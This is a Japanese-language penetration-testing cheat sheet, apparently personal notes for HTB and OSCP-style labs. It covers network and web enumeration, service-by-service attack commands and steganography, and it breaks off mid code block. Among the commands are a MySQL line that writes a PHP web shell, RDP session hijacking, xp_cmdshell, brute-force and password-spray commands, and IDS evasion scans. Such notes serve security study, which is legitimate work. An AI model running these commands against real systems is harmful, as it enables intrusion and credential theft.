# Pyenv
```sh
python3 -m venv venv
source venv/bin/activate
```

# Win 実行ファイルエラー回避
```sh
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

# Enumeration
## ネットワーク範囲内でホストの列挙
### Nmap
```sh
nmap -sn 10.10.110.0/24
```

### fping
```sh
fping -asgq 172.16.1.0/24
```
結果を、targets.txtとして保存すれば、以下のコマンドで順にやってくれる
```sh
nmap -iL targets.txt -Pn -sS
```
## ホスト・OSベースの列挙
### ping
```bash
ping -c 1 $Target_IP
````
- `ttl=64` → Linux OS/Mac OS
- `ttl=128` → Windows OS
- `ttl=255` → UNIX OS/ネットワーク機器

### Nmapシンプル
TCPスキャン
```shell-session
sudo nmap -v -sCV -T4 -p0-65535 -Pn $Target_IP
```

UDPスキャン
```sh
sudo nmap -sU -T4 -p0-65535 -Pn $Target_IP
```

```sh
sudo nmap -sU -T4 -Pn $Target_IP
```

### Nmapセット

```sh
echo 'export Target_IP=""' >> ~/.zshrc
source ~/.zshrc
```

不安だったら、`-T2`とかに
```bash
sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP
```

#### hosts.txtバージョン
色んなホストを集めたhosts.txtに対して、上のNmapセットを行うスクリプト

nmap_multi.sh
```sh
#!/bin/bash

# 引数チェック
if [ $# -eq 0 ]; then
    echo "Usage: $0 <hosts_file>"
    echo "Example: $0 hosts.txt"
    exit 1
fi

hosts_file="$1"

# ファイルの存在確認
if [ ! -f "$hosts_file" ]; then
    echo "Error: File '$hosts_file' not found!"
    exit 1
fi

# 出力ディレクトリの作成
output_dir="nmap_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$output_dir"

echo "=== Starting Nmap scan for multiple hosts ==="
echo "Hosts file: $hosts_file"
echo "Output directory: $output_dir"
echo ""

# ファイルから1行ずつ読み込んでスキャン
while IFS= read -r target_ip || [ -n "$target_ip" ]; do
    # 空行やコメント行をスキップ
    [[ -z "$target_ip" || "$target_ip" =~ ^[[:space:]]*# ]] && continue
    
    echo "=========================================="
    echo "Scanning: $target_ip"
    echo "=========================================="
    
    # ホスト名をファイル名に使用（IPアドレスの.を_に置換）
    safe_hostname=$(echo "$target_ip" | tr './:' '_')
    
    # ポートスキャン
    echo "[*] Phase 1: Port discovery..."
    sudo nmap -p0-65535 -T4 -Pn -v --open "$target_ip" -oG "$output_dir/${safe_hostname}_open_ports.txt"
    
    # ポート抽出
    ports=$(grep "Ports:" "$output_dir/${safe_hostname}_open_ports.txt" | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
    
    if [ -z "$ports" ]; then
        echo "[!] No open ports found for $target_ip"
        echo ""
        continue
    fi
    
    echo "[*] Found open ports: $ports"
    echo "[*] Phase 2: Service and version detection..."
    
    # 詳細スキャン
    sudo nmap -sCV -A -Pn -p"$ports" -vv "$target_ip" -oN "$output_dir/${safe_hostname}_detailed.txt" -oX "$output_dir/${safe_hostname}_detailed.xml"
    
    echo "[✓] Scan completed for $target_ip"
    echo ""
    
done < "$hosts_file"

echo "=========================================="
echo "All scans completed!"
echo "Results saved in: $output_dir"
echo "=========================================="
```

```sh
chmod +x nmap_multi.sh
sudo ./nmap_multi.sh hosts.txt
```


### 脆弱性の確認
```sh
sudo nmap -sV -p <PORT> --script "vuln" $Target_IP
```
### Firewallとルールの確認
UDPスキャン
```shell-session
sudo nmap $Target_IP -p<空いてるポート> -sU -Pn -n --disable-arp-ping --packet-trace
```

TCP ACKスキャン : SYNスキャン (`-sS`) や Connectスキャン (`-sT`) と比べて、ブロックされにくい
```shell-session
sudo nmap $Target_IP -p<空いてるポート> -sA -Pn -n --disable-arp-ping --packet-trace
```

#### IPS/IDSの回避？(撹乱)

Decoy（デコイ）スキャン（`-D`）の利用
```shell-session
sudo nmap $Target_IP -p- -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```

ソースIPアドレス（`-S`）を手動で指定することもできる
```shell-session
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200
```

##### DNSプロキシによる回避
```shell-session
sudo nmap $Target_IP -p<空いてるポート> -sS -Pn -n -sV --disable-arp-ping --packet-trace --source-port 53
```


#### 回避コマンドセット
UDP
```shell-session
sudo nmap $Target_IP -sU -Pn -n -vvv -A --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA "scan_output" -T2 -F
```

TCP
```shell-session
sudo nmap $Target_IP -sA -Pn -sCV -vvv --n --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA "scan_output" -T2 -F
```

ポートがわかったなら、これでも取得できる
```shell-session
snowyowl644@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000
```

## Web系
### Burpsuite
ブラウザ
```sh
chromium --user-data-dir=/tmp/burp --proxy-server="http://127.0.0.1:8080"
```

```sh
# Java 21 の実体パスを確認（Kali arm64 の例）                            
readlink -f /usr/lib/jvm/java-21-openjdk-arm64/bin/java
# そのパスを JAVA_CMD として一時指定して起動
JAVA_CMD=/usr/lib/jvm/java-21-openjdk-arm64/bin/java burpsuite
```

### Nikto
とりあえずNikto!!!! Microsoft IMSみたいな何もないようなサイトでもやる！！！！！
```sh
nikto -h http://
```
.DS_Store見つかったら
- 特定のページにアクセスできる隠しファイルやフォルダを見つけるのに最適
```sh
wget https://github.com/lijiejie/ds_store_exp/raw/refs/heads/master/ds_store_exp.py
pip install ds-store requests
python ds_store_exp.py http://10.13.38.11/.DS_Store
```
### Feroxbuster 
```bash
feroxbuster -u <http://TARGET> -C 404 -C 500
```

### Dirsearch
```bash
sudo apt install dirsearch -y
```

```bash
sudo dirsearch --url= --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple
```

### GoBuster
- `-x`で、phpをつけて調査することができる
- `dir`オプションは、Uses directory/file enumeration mode
```sh
sudo gobuster dir -u https://10.10.247.22/dev/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php -k --timeout 30s
```
### ffuf
#### サブドメインのファジング
- 辞書サイズが小さい順
	- `/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
	- `/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`
- `-mc 200`は絶対に使うな
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://<domain> -H "Host: FUZZ.<domain>" -fs 
```
 - 注意点としては、サブドメインにも、hostsで設定しないとサーバーエラーになる

ちなみに、dnsゾーン転送が許可されている場合は、サブドメインが表示されることもある
```
dig axfr inlanefreight.local @10.129.229.147
```


以下の方法もある
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
     -u http://zynect.zishuieng.com/ \
     -H "Host: FUZZ.zishuieng.com" \
     -mc 200,301,302,403 \
     -t 5 \
     -p 0.2
```

#### ディレクトリ・ページのファジング
```sh
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
```

#### 拡張子のファジング
ディレクトリファジングができてもサイトの拡張子がわからない時があるので、拡張子をファジングする
- 拡張子がわかったら、ページ名だけでファジングすることによって、より効率よくページをファジングできる
```shell-session
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/<>/FUZZ
```

#### ページのファジング
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.<拡張子のファジングでわかった拡張子>
```

#### 再帰的ファジング
feroxbusterみたいに、ディレクトリとフォルダをいっぺんにファジングできる
- `-recursion-depth 1`: サブディレクトリ1階層分までスキャン
- 拡張子を指定する場合は `-e .php`
	- 結果が多くなるので -v を使ってURLを明確に表示するのが便利
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```

```sh
feroxbuster -u http://faculty.academy.htb:57022/ -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,phps,php7
```
#### VHOST(仮想ホスト)
仮想ホストとサブドメインの違い
- 同じIPアドレスでも、**Hostヘッダ**によって表示される内容を切り替える
- Apache や Nginx が「Host: admin.academy.htb」を見て処理を変えてる
```shell-session
ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

#### パラメータファジング
- URLの中の「?param=value」のような部分の「param」を探すこと
- 非公開パラメータが見つかることがあり、セキュリティ上の弱点に繋がることもある
- 今回のターゲット
	- `http://admin.academy.htb:PORT/admin/admin.php`
	- アクセスすると「You don't have access to read the flag」と表示される
		- → 何か認証的なチェックをしている
		- → 特定のパラメータを送ることでアクセスできるかも？
- ffufを使って使用しているパラメータをファジングする

**GETパラメータ**
```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

**POSTパラメータ**
- POSTとGETの違い
	- GET：URLに「?param=value」とつけてパラメータを渡す
	- POST：パラメータはリクエストボディ（本文）に含まれ、URLには出ない
	- → POSTでは `-d` オプションで本文データを指定する必要がある
	- あと、Content-Typeを必ず指定する
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

スキャン結果が出たら、curlで確認する
- レスポンスに「Invalid id!」というエラーメッセージが出た
	- → `id` というパラメータが**有効**であり、**何らかの値のチェックが行われている**
```shell-session
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
```


#### 値のファジング
- なにをするの？
	- 有効なパラメータ（例：`id`）がわかったら、今度はその「値（value）」を総当たりで試す
	- 例：`id=1`, `id=2`, `id=3`, ... のように試して、フラグが表示されるIDを探す！
- なぜ難しい？
	- パラメータの「値」は決まった形式（数字、文字列、UUIDなど）がある
	- 既存のワードリストでは合わないこともあるので、自分でリストを作ることも多い

辞書作り
```shell-session
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

ファジング
```shell-session
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```
### VHOSTの列挙

```bash
gobuster vhost -u http://$Target_IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Whatweb
```
whatweb <http://...>
```

```shell-session
whatweb --no-errors 10.10.10.0/24
```

### Scrapy
- サイト内のemail・ink・コメント収集してくれるツール
- データはJSONファイル`results.json`に保存される

インストール
```shell-session
pip3 install scrapy
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip 
```

実行
```shell-session
python3 ReconSpider.py http://
```

結果確認
```sh
cat results.json
```
### XSS
管理用のページと、管理用ページに何かしらする系→Stoerd XSSがあることありますよ
保存型XSSあるので、見逃さずに
過去の例
- [[K2　Base Camp (今度は何も見ずに解く)]]

WAF回避の例
- [[K2　Base Camp (今度は何も見ずに解く)]]


CTFでは関係ないけど、実務では関係あるrefleted XSS、DOM XSSの検出に使える
- XSStrike
	- 高度なXSS検出スイート
	- https://github.com/s0md3v/XSStrike
```sh
python3 -m venv venv
source venv/bin/activate
python xsstrike.py
```

```sh
python xsstrike.py -u "http://it.k2.thm/login?msg="

python xsstrike.py -u "http://it.k2.thm/dashboard" --data "title=test&description=test" --headers "Cookie: session=eyJhdXRoX3VzZXJuYW1lIjoiYWRtaW4iLCJpZCI6MiwibG9nZ2VkaW4iOnRydWV9.aF6veA.aKrd7cyseAM1NAkih0QM7l2rbbc"
```


### SQL Injection
- サーバーと通信して検索する系のページ、絞り込む系のページ→ SQL インジェクションあることありますよ

#### 検出
- `'`を入れる
	- 500エラーだったら、SQL Injectionの脆弱性ある可能性あり
	- しかし、これではStored SQL Injecttionは検出できない
	- 

### レポート作成ツール
#### EyeWitness
ターゲットWebアプリケーションのスクリーンショットを撮り、指紋を取得し、可能なデフォルトの資格情報を識別するために使用できる
```sh
sudo apt install eyewitness
```

- `-d ` : 保存先のディレクトリ
	- HTMLに保存される
```shell-session
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```

#### Aquatone
- Aquatone は EyeWitness に似たツール

インストール
```shell-session
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip 
```

- web_discovery.xml（Nmap出力ファイル）をAquatoneに渡して実行する
```shell-session
cat web_discovery.xml | ./aquatone -nmap
```


### サイトコンテンツ
#### robots.txt
- robots.txtが見つかったら、disallowに注目
#### Certificate Transparency Logs

```shell-session
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u
```

### WAFの確認
- `wafw00f`
	- WAFの有無や種類、設定情報を特定可能。
```shell-session
pip3 install git+https://github.com/EnableSecurity/wafw00f
```

```shell-session
wafw00f <ドメイン>
```

## プロキシ
### Metasploit
```sh
msfconsole
use auxiliary/scanner/http/robots_txt
set PROXIES HTTP:127.0.0.1:8080
set RHOST SERVER_IP
set RPORT PORT
run
```
### Nmap
```sh
nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
```
### BurpSuite
- ターミナルから起動 : `burpsuite`
- ダークテーマ : User Options > Display > Theme にて「dark」を選択

### OwaspZAP
- ダウンロードページ : https://www.zaproxy.org/download/
- ターミナルから起動 : `zaproxy`
- ダークテーマ : Tools > Options > Display > Look and Feel から「Flat Dark」を選択
- 詳細　: [[Pentest_Technique/Linux・Windows共通#OwaspZAP|Linux・Windows共通]]


# プロトコル
## SSH

構成チェック
```
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py 10.129.14.132
```

パスワード認証を強制
```
ssh -v <ユーザー名>@$Target_IP -o PreferredAuthentications=password
```

**トラブルシュート**
sshのはずなのに、なぜか接続出来ずに止まっている
まず、`-v`をつけて、どこで止まっているのかを確認する

- 止まっている時の最終行が、`debug1: expecting SSH2_MSG_KEX_ECDH_REPLY`の場合
	- 他の鍵交換アルゴリズムを試すことができる
	- エラー前提で、`-o KexAlgorithms=diffie-hellman-group14-sha1`をコマンドに追加して、実行する
		- `no matching key exchange method found. `というエラーが出て、そのサーバーが対応している鍵アルゴリズムが提示される
		- なので、出力された鍵交換アルゴリズムをオプションにつけて実行する

ログインしてもwelcomeメッセージで止まっちゃう
シェルが原因の可能性あり
シェルを変更する
`-t "/bin/sh"`で変更できる

```sh
ssh anita@192.168.223.246 -i anita_id_rsa -p 2222 -o KexAlgorithms=diffie-hellman-group14-sha256 -t "/bin/sh"
```


## Rsync
- 公開モジュール確認
```
nc -nv $Target_IP 873
rsync -av --list-only rsync://127.0.0.1/dev
```

- 全取得
```
rsync -av rsync://$Target_IP/dev
```


## R-Services
- rlogin
```
rlogin $Target_IP -l <username>
```

- ログイン中ユーザー確認
```
rwho
rusers -al $Target_IP
```


## RDP
- 通常接続
	- NTLM認証のみ
	- 下でもダメな時　`/auth-pkg-list:none,ntlm`
```
xfreerdp3 /u:<ユーザー名> /p:"<パスワード>" /v:$Target_IP /d:<ドメイン名> /dynamic-resolution　/clipboard /auth-pkg-list:none,ntlm /cert:ignore
```

- 接続確認
```sh
nxc rdp 192.168.191.227 -u 'nadine' -p nicole1 --ignore-pw-decoding --local-auth
```

- セキュリティ診断
```
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

- セッションハイジャック (tscon)
```
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

xfreerdp3がなんかうまくいかない時、**Remmina**が俺たちにはある
なぜかうまくいくことある
RemminaはGUIなので、左上のappメニューから探して、使おう

## WinRM
- evil-winrm 接続
```
evil-winrm -i TargetIP -u Cry0l1t3 -p P455w0rD!
```
upload・downloadコマンドで、ファイルを転送できる

```sh
evil-winrm -i TargetIP -u Cry0l1t3 -H <LMハッシュ>
```
## WMI

- wmiexec
```
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```


## ASP.NET
- （_.aspx_ などをアップロードしてアクセス）

## FTP
- 匿名接続
	- ftp : [空白]
- 認証情報は、これやった後にユーザー名とパスワードを入力する
```
ftp -p $Target_IP
```

- Nmap スクリプト一括
```
sudo nmap -sCV -A -Pn -p21 -vv $Target_IP --script "/usr/share/nmap/scripts/ftp*.nse"
```

- SSL 証明書確認
```
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

- ブルートフォース例
```
hydra -L users.list -P passwords.list ftp://$Target_IP:21 -t 64
```

- FTP バウンススキャン
```
nmap -Pn -v -n -p<ポート> -b <user>:<pass>@<FTP_IP> <Target_IP>
```


## Samba / SMB

- 共有列挙 (匿名)
```
nxc smb <IP> -u 'guest' -p '' --shares
smbclient -N -L //$Target_IP
smbclient -L //$Target_IP/  -U USERNAME%PASSWORD

```

- 匿名共有内参照/取得
```sh
smbclient -N //$Target_IP/SHARENAME
```

- 再起的にリストする
	- フォルダに移動後
```sh
smb: \Users\offsec\AppData\local\Microsoft\Credentials\> recurse on smb: \Users\offsec\AppData\local\Microsoft\Credentials\> ls
```

- 書き込み
```sh
put myfile.txt
```

- 共有内参照/取得
```
smbclient -L //$Target_IP/  -U USERNAME%PASSWORD
smbclient //"$Target_IP"/SHARENAME -U USERNAME%PASSWORD
smbmap -H $Target_IP -u USERNAME -p 'PASSWORD' -s SHARENAME
```

単一ファイル取得
```sh
smbget "smb://offsec:lab@192.168.145.248/transfer/DB-back%20(1)/New%20Folder/Emma/Documents/Database.kdbx"

sudo mkdir -p /mnt/x
sudo mount -t cifs //192.168.145.248/transfer /mnt/x -o username=offsec,password=lab,vers=2.1
cp "/mnt/x/DB-back (1)/New Folder/Emma/Documents/Database.kdbx" ./emma_Database.kdbx
sudo umount /mnt/x
```

- OS / 脆弱性スキャン
```
nmap --script smb-os-discovery.nse -p445 $Target_IP
nmap --script=smb-vuln* -p139,445 $Target_IP
```

- rpcclient NULL セッション
```
rpcclient -U "" -N $Target_IP
```

- windowsから直接叩きたい場合
	- dc01上で実行されているすべての共有を一覧表示
```sh
net view \\dc01 /all
```
## NFS

- エクスポート確認
```
showmount -e $Target_IP
```

- マウント例
```
mkdir target-NFS
sudo mount -t nfs $Target_IP:/ ./target-NFS/ -o nolock
```

上でsudoでマウントしているが、一般権限でも扱えるようにしてほしい
```sh
sudo chown -R $USER:$USER <フォルダ名>
sudo chmod -R 755 <フォルダ名>
```

## DNS
- 基本照会
```
dig A  inlanefreight.htb
dig NS inlanefreight.htb
dig AXFR inlanefreight.htb @$Target_IP      # ゾーン転送試行
```

hostコマンド
```sh
host -t mx <domain>
```
- MXレコードのみを取得するコマンドを実行し、4つの異なるメールサーバーレコードが返された
- 各サーバーには異なる優先度（10、20、50、60）があり、優先度番号が最も低いサーバーが、ドメインのメールを最初に転送するために使用される

DNSRecon
- 主要なレコード タイプのスキャン
```
git clone https://github.com/darkoperator/dnsrecon
cd dnsrecon
dnsrecon -d <Domain> -t std
```

- 辞書攻撃でのサブドメインブルートフォース
```sh
dnsrecon -d <Domain> -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt
```
DNSのドメインの↑より大きい辞書
- `/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`

DNSEnum
```sh
dnsenum <ドメイン>
```

- 総当たりサブドメイン
```
dnsenum --dnsserver $Target_IP --enum -f wordlist.txt inlanefreight.htb
```

windowsのnslookup
```sh
nslookup <Domain> <IP>
```

より具体的にDNSサーバーを指定して、実行した様子
```sh
nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

## SMTP
- バナー & コマンド列挙
```
sudo nmap $Target_IP -sC -sV -p25
```

- オープンリレー検査
```
sudo nmap $Target_IP -p25 --script smtp-open-relay
```

- swaks 送信
```
swaks --from a@b --to c@d --server $Target_IP
```

- 接続
```sh
nc -nv 192.168.50.8 25
```


## SNMP
- Simple Network Management Protocol
- UDPで、IPスプーフィングやリプレイ攻撃の影響を受けやすい

[onesixtyone](http://www.phreedom.org/software/onesixtyone/)
- IPアドレスのリストに対してブルートフォース攻撃を行う
```sh
echo public > community
echo private >> community
echo manager >> community
fping -asgq <IP Range>.0/24 > ips
onesixtyone -c community -i ips
```

 SNMP 値を調査および照会する
```sh
snmpwalk -c public -v1 -t 10 <IP>
```

snmpwalk
```
snmpwalk -c public -v1 <IP> <MIB>
```
MIBの表

| 1.3.6.1.2.1.25.1.6.0   | System Processes    |
| ---------------------- | ------------------- |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs    |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path      |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units       |
| 1.3.6.1.2.1.25.6.3.1.2 | Software Name       |
| 1.3.6.1.4.1.77.1.2.25  | User Accounts       |
| 1.3.6.1.2.1.6.13.1.3   | TCP Local Ports     |
| 1.3.6.1.2.1.2.2.1.2    | インタフェースのDescription |



## IMAP / POP3

- SSL 接続
```
openssl s_client -connect $Target_IP:imaps
```

- hydra ブルート
```
hydra -L users.txt -P passwords.txt imap://$Target_IP
```


## クラウドメール (O365)

- 利用可否確認 & 列挙
```
python3 o365spray.py --validate --domain <domain>
python3 o365spray.py --enum -U users.txt --domain <domain>
```

- パスワードスプレー
```
python3 o365spray.py --spray -U usersfound.txt -p 'Passw0rd!' --count 1 --lockout 1 --domain <domain>
```


## SNMP

- walk (public)
```
snmpwalk -v2c -c public $Target_IP
```

- コミュニティ文字列ブルート
```
onesixtyone -c wordlist.txt $Target_IP
```

- OID ぶら下げ
```
braa public@$Target_IP:.1.3.6.*
```


## MySQL

- 接続
```
mysql -u root -pP4SSw0rd -h $Target_IP
```

windows
- WinRMなどで、いbんたらくティブシェルがない場合
```sh
.\mysql.exe -u root -h localhost -e "SHOW DATABASES;"
```

- ファイル読込 / 書込
```
SELECT LOAD_FILE('/etc/passwd');
SELECT "<?php system($_GET[cmd]);?>" INTO OUTFILE '/var/www/html/shell.php';
```

- 情報表示
```
show databases;          -- DB 一覧
show tables;             -- テーブル一覧
show columns from <tbl>; -- カラム
```


## MSSQL

- nmap スクリプトセット
```
sudo nmap -p1433 --script ms-sql-* $Target_IP
```

- mssqlclient 接続
```
impacket-mssqlclient Administrator@$Target_IP -windows-auth
enable_xp_cmdshell       # cmdshell 有効化
xp_cmdshell whoami
```

- ハッシュ取得
```
SELECT name,password_hash FROM master.sys.sql_logins;
```


## Oracle TNS
- odat で SID ブルート
```
./odat.py all -s $Target_IP
```

- sqlplus 接続
```
sqlplus scott/tiger@$Target_IP/XE
```

- パスワード一覧取得
```
select name,password from sys.user$;
```


## IPMI

- バージョン検出
```
sudo nmap -sU -p623 --script ipmi-version $Target_IP
```

- ハッシュダンプ (Metasploit)
```
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

- ipmitool 操作
```
ipmitool -I lanplus -H $Target_IP -U <user> -P <pass> chassis power status
```


## LDAP / Kerberos

- 匿名 bind
	- 匿名バインド（Anonymous Bind）ができる＝必ずユーザー情報が取れるというわけではありません。
```
ldapsearch -x -H ldap://$Target_IP -s base
```


- ドメインダンプ
```
ldapdomaindump ldap://$Target_IP --no-json -d <domain>
```

- Kerbrute ユーザ列挙
	- 認証情報必要
```
kerbrute userenum --dc $Target_IP -d <domain> users.txt
```

- SPN 取得
```
GetUserSPNs.py <domain>/<user>:<pass>@$Target_IP
```

- AS-REP Roast
	- ユーザー辞書さえあれば、できる
```
GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip $Target_IP
```



## IIS

- サーバ情報確認
```
curl -I http://$Target_IP | grep Server:
```

- 短名列挙
```
nmap -p80 --script http-iis-short-name-brute $Target_IP
```

- WebDAV シェル配置
```
curl -T shell.aspx http://$Target_IP/shell.aspx
```


# 脆弱性の探索

## 脆弱性スキャナー
- [Nessus Essentials](https://community.tenable.com/s/article/Nessus-Essentials)
	- 公式のNessus脆弱性スキャナーの無料バージョン
	- 環境の脆弱性を特定しようとする
	- なんかサーバーにたてて使うらしい
-  [OpenVAS](https://www.openvas.org/)
	- 公開されているオープンソースの脆弱性スキャナー
	- 認証済みおよび非認証済みテストを含むネットワークスキャンを実行できる

セットアッププロセスが開始され、最大30分かかります
- 長すぎだろ
```shell-session
sudo apt-get install gvm && openvas
gvm-setup
```
OpenVas起動
```shell-session
gvm-start
```

`https://< IP >:8080`でアクセスできる

## .Gitが見つかったら

- .gitがあったら、.git/logs/HEADを参照したら、remoteのurl出てきたりすることがある
- GitHackを使って、gitファイルをダンプする
	- [https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)
```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python GitHack.py http://www.openssl.org/.git/
```

## XSS (Cross Site Script)

HTBやOSCPではXSSの脆弱性を使うことはないため、真っ先に除外する。  
XSSは他のユーザーが引っかかる必要があるが、HTBやOSCPには対象が存在しない。
- わけではないこともあることがわかった。SeaはXSSからのRCEで侵入できる。

## Searchsploit
### 複数の脆弱性を見つけたとき
 .txtよりもコードが書かれた脆弱性を選ぶべき
 迷った時は数字が後の方の方を選ぶべし
	 より最新で、上手くいく可能性が高いから

- searchsploitでExploitDBのリンクも表示するオプション
- でも、これつけるとローカルでの場所が表示されなくなっちゃう😢
  ```bash
  searchsploit -w <検索キーワード>
  ```
### PoCをダウンロードしたい時
 searchsploit -m <脆弱性の番号>
  - -m : ミラー
### 使い方だけ出力したい
	 | grep -i usage <PoC file>

- Authenticated~系は、攻撃者がログインした後にできる攻撃なので、ログインしてないと無理
### Searchsploitだけで全てだと思わない。Google検索もする
検索キーワード　: `SoftwareName Version CVE`

### Windowsの有名な脆弱性


| **脆弱性**                      | **説明**                                                                                                               | **条件**                                                                                                                                 |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| **MS08-067**                 | SMB の脆弱性に対して多くの Windows バージョンに緊急パッチが適用されたもの。Conficker や Stuxnet でも悪用され、Windows ホストへの侵入が非常に容易になる。                     | - SMB (445番ポート) が開放<br>- Windows XP / Server 2003 / 2008 などで未パッチ                                                                       |
| **Eternal Blue**<br>MS17-010 | MS17-010 として知られ、NSA から流出した Shadow Brokers のダンプに含まれていたエクスプロイト。SMB v1 の欠陥を突いてコード実行が可能。WannaCry や NotPetya などの攻撃で悪用された。 | SMBv1 が有効<br>Windows 7 / Server 2008 R2 などで未パッチ- 無認証で攻撃可能<br>windows/smb/ms17_010_eternalblueがダメでもwindows/smb/ms17_010_psexecは行ける可能性ある |
| **PrintNightmare**           | Windows Print Spooler のリモートコード実行脆弱性。プリンタ ドライバのインストール経由で SYSTEM 権限を奪取可能。2021年に猛威を振るった。                                | - Print Spooler サービスが有効<br>- （多くの場合）低権限シェルまたは有効な資格情報が必要                                                                                |
| **BlueKeep**                 | CVE-2019-0708。RDP の特定チャネルの欠陥を突いてコード実行を行う。Windows 2000 ～ Server 2008 R2 まで広範囲に影響。                                     | - RDP (3389番ポート) が開放<br>- Windows 7 / Server 2008 R2 などで未パッチ                                                                           |
| **Sigred**                   | CVE-2020-1350。DNS サーバー（通常はドメインコントローラ）の SIG レコード処理を悪用。成功するとドメイン管理者権限を得る可能性がある。                                        | - Windows DNS サーバーが未パッチ- 外部から DNS レコードを注入可能または制御下に置ける環境                                                                                |
| **SeriousSam**               | CVE-2021-36934。C:\Windows\system32\config のパーミッション不備により、非特権ユーザーでも SAM を読み取れる。Volume Shadow Copy 経由でダンプが可能。           | - Windows 10 / Server 2019 など特定バージョンで未修正<br>- Volume Shadow Copy が有効- フォルダの実行許可設定ミス                                                    |
| **Zerologon**                | CVE-2020-1472。Netlogon RPC (MS-NRPC) の暗号化欠陥を突く。ドメインコントローラに対して総当たりが可能で、成功するとドメイン管理者権限まで奪取し得る。                         | - ドメインコントローラが未パッチ- MS-NRPC (Netlogon) にアクセス可能<br>- 攻撃成功でドメイン管理者権限取得の可能性                                                                |





# ステガノグラフィ
CTFでは、意味ありげな画像がポンと渡されて、何も情報がない場合、ステガノグラフィーのこともある。

ファイルの埋め込み
```bash
steghide embed -cf cvr.jpg -ef emb.txt
```
データの抽出:
```bash
steghide extract -sf stg.jpg
```
### パスフレーズがかかってて、突破できない時
何が入ってるのかを確認する
```bash
sudo apt install stegcracker -y
sudo apt install steghide -y
sudo steghide info *.jpg
```
何も入力しないでEnterを押すことで突破できないか試す
```bash
sudo steghide extract -sf *.jpg
```
ヒントの確認
	- 隠されたパスフレーズがファイルのメタデータや埋め込まれたコメントに含まれている場合がある。以下のコマンドでチェック
```bash
strings HackerAccessGranted.jpg
exiftool HackerAccessGranted.jpg
```

辞書攻撃
- よく使用される辞書ファイル
- `rockyou.txt`（多くのステガノグラフィー攻撃で利用される）
```bash
